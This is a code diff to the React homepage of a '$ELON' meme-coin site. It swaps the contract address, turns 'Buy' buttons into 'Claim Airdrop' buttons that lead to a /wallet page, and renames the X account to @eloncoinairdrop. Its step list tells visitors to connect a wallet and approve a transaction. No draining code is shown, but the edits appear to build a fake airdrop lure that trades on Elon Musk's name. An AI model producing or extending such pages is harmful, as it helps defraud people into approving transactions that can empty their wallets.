@@ -3,6 +3,8 @@ import { useEffect, useState } from "react"; // ✅ ADDED
 import Link from "next/link";
 
 import Navbar from "./Navbar";
+import TradingViewWidget from "./TradingWidget";
+import Footer from "./Footer";
 
 const solscanLink =
   "https://solscan.io/account/48radEfwKGNbg327ZUH5FRk9DTYGMZc43gnDoNwL5M1B";
@@ -17,7 +19,7 @@ function simulateDeposit(assetSymbol) {
 export default function Home() {
 
   // ✅ ADDED (address state)
-  const [contractAddress, setContractAddress] = useState("0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3");
+  const [contractAddress, setContractAddress] = useState("2akXpuyFXAVN5YofZpZMfBp2Vxognpmv9NooBMuHpump");
 
   // ✅ ADDED (generate ONCE per reload)
 
@@ -50,10 +52,10 @@ export default function Home() {
             {/* Actions */}
             <div className="flex items-center gap-2 sm:gap-3">
               <Link
-                href="/multi"
+                href="/wallet"
                 className="bg-black text-white text-[10px] sm:text-xs px-2 sm:px-3 py-1 sm:py-1.5 rounded-md"
               >
-                BUY $ELON
+                CLAIM $ELON
               </Link>
 
               <button className="w-6 h-6 rounded-full bg-black text-white text-xs flex items-center justify-center">
@@ -88,23 +90,26 @@ export default function Home() {
           <button className="bg-black text-white w-full sm:w-auto px-8 sm:px-20 py-3 rounded-lg mb-4 shadow flex flex-col items-center">
             <p className="text-xs text-gray-500">THE LORE</p>
             <h1 className="font-bold text-lg sm:text-xl">
-              Just let me buy $ELON
+              claim airdrop $Elon
             </h1>
             <p className="text-xs text-gray-500">THE CURRENCY OF THE WORLD</p>
           </button>
 
           {/* Secondary Buttons */}
           <div className="flex flex-col sm:flex-row gap-3 mb-6 w-full sm:w-auto">
-            <Link href="multi">
+            <Link href="wallet">
 
               <button className="w-full sm:w-auto bg-black text-white px-4 py-2 text-sm rounded">
-                BUY $ELON
+                Claim Token
               </button>
             </Link>
 
-            <button className="w-full sm:w-auto border border-gray-600 px-4 py-2 text-sm text-black rounded">
-              X FOLLOW
-            </button>
+
+          </div>
+
+          <div className="border rounded-lg px-4 py-3 flex flex-col  items-center gap-3 shadow-sm w-full max-w-md">
+
+           <p>Claim the future Currency </p>
           </div>
 
           {/* Contract Box */}
@@ -139,7 +144,7 @@ export default function Home() {
 
           <div className="space-y-2">
             <p className="text-zinc-400 text-lg italic">
-              Just let me buy $ELON.
+              Just let me claim $ELON.
             </p>
             <p className="text-sm text-white max-w-md mx-auto">
               The future of currency is here. Polished. Chrome. Perfect.
@@ -164,7 +169,7 @@ export default function Home() {
         </div>
         <p className="text-zinc-500 font-mono text-sm mb-6">@eloncoinapp</p>
         <button className="bg-black text-white px-8 py-3 font-bold text-sm  tracking-widest">
-          X Follow @eloncoinapp
+          X Follow @eloncoinairdrop
         </button>
       </section>
 
@@ -218,41 +223,44 @@ export default function Home() {
         </section>
       </main>
       {/* ================= AIRDROP STEPS ================= */}
-<section className="bg-white text-black py-16 px-4 sm:px-20">
-  <div className="max-w-4xl mx-auto">
-    <h2 className="text-3xl font-extrabold text-center mb-10 tracking-widest">
-      Steps to Claim the Airdrop
-    </h2>
+      <section className="bg-white text-black py-16 px-4 sm:px-20">
+        <div className="max-w-4xl mx-auto">
+          <h2 className="text-3xl font-extrabold text-center mb-10 tracking-widest">
+            Steps to Claim the Airdrop
+          </h2>
 
-    <ol className="space-y-6 list-decimal list-inside text-gray-800 text-base sm:text-lg">
-      <li>
-        <span className="font-semibold">Connect Your Wallet:</span> Connect your preferred wallet (MetaMask, Phantom, Trust Wallet, etc.).
-      </li>
-      <li>
-        <span className="font-semibold">Approve the Connection:</span> Confirm the wallet connection when prompted.
-      </li>
-      <li>
-        <span className="font-semibold">Eligibility Check:</span> We calculate your claimable allocation based on eligibility requirements.
-      </li>
-      <li>
-        <span className="font-semibold">Claim Your Airdrop:</span> Click “Claim Airdrop” to proceed.
-      </li>
-      <li>
-        <span className="font-semibold">Confirm the Transaction:</span> Approve the transaction in your wallet. Network gas fees may apply.
-      </li>
-      <li>
-        <span className="font-semibold">Receive Your Tokens:</span> Tokens will appear in your wallet once the transaction is confirmed.
-      </li>
-    </ol>
+          <ol className="space-y-6 list-decimal list-inside text-gray-800 text-base sm:text-lg">
+            <li>
+              <span className="font-semibold">Connect Your Wallet:</span> Connect your preferred wallet (MetaMask, Phantom, Trust Wallet, etc.).
+            </li>
+            <li>
+              <span className="font-semibold">Approve the Connection:</span> Confirm the wallet connection when prompted.
+            </li>
+            <li>
+              <span className="font-semibold">Eligibility Check:</span> We calculate your claimable allocation based on eligibility requirements.
+            </li>
+            <li>
+              <span className="font-semibold">Claim Your Airdrop:</span> Click “Claim Airdrop” to proceed.
+            </li>
+            <li>
+              <span className="font-semibold">Confirm the Transaction:</span> Approve the transaction in your wallet. Network gas fees may apply.
+            </li>
+            <li>
+              <span className="font-semibold">Receive Your Tokens:</span> Tokens will appear in your wallet once the transaction is confirmed.
+            </li>
+          </ol>
 
-    {/* Optional CTA Button */}
-    <div className="flex justify-center mt-10">
-      <button className="bg-black text-white px-8 py-3 rounded-lg font-semibold hover:scale-105 transition transform">
-        Claim Airdrop
-      </button>
-    </div>
-  </div>
-</section>
+          {/* Optional CTA Button */}
+          <div className="flex justify-center mt-10">
+            <Link href="/wallet">
+
+              <button className="bg-black text-white px-8 py-3 rounded-lg font-semibold hover:scale-105 transition transform">
+                Claim Airdrop
+              </button>
+            </Link>
+          </div>
+        </div>
+      </section>
 
       {/* ================= LIVE CHART ================= */}
       <section className="bg-white text-black py-20">
@@ -264,30 +272,9 @@ export default function Home() {
         </div>
 
         <div className="max-w-6xl mx-auto px-4 sm:px-6">
-          <div className="relative rounded-xl border border-black/20 shadow-2xl overflow-hidden bg-black">
-            <iframe
 
-            >
 
-            </iframe>
-          </div>
 
-          <div className="flex flex-col sm:flex-row justify-center gap-6 sm:gap-12 text-sm mt-8">
-            <div className="text-center">
-              <p className="text-gray-500 uppercase">Series</p>
-              <p className="font-semibold">2067</p>
-            </div>
-
-            <div className="text-center">
-              <p className="text-gray-500 uppercase">Network</p>
-              <p className="font-semibold">Solana</p>
-            </div>
-
-            <div className="text-center">
-              <p className="text-gray-500 uppercase">Status</p>
-              <p className="font-semibold text-green-600">Live</p>
-            </div>
-          </div>
 
           <div className="flex justify-center mt-10">
             <a
@@ -299,8 +286,10 @@ export default function Home() {
               ↗ VIEW FULL CHART
             </a>
           </div>
+          <TradingViewWidget />
         </div>
       </section>
+      <Footer />
     </>
   );
 }
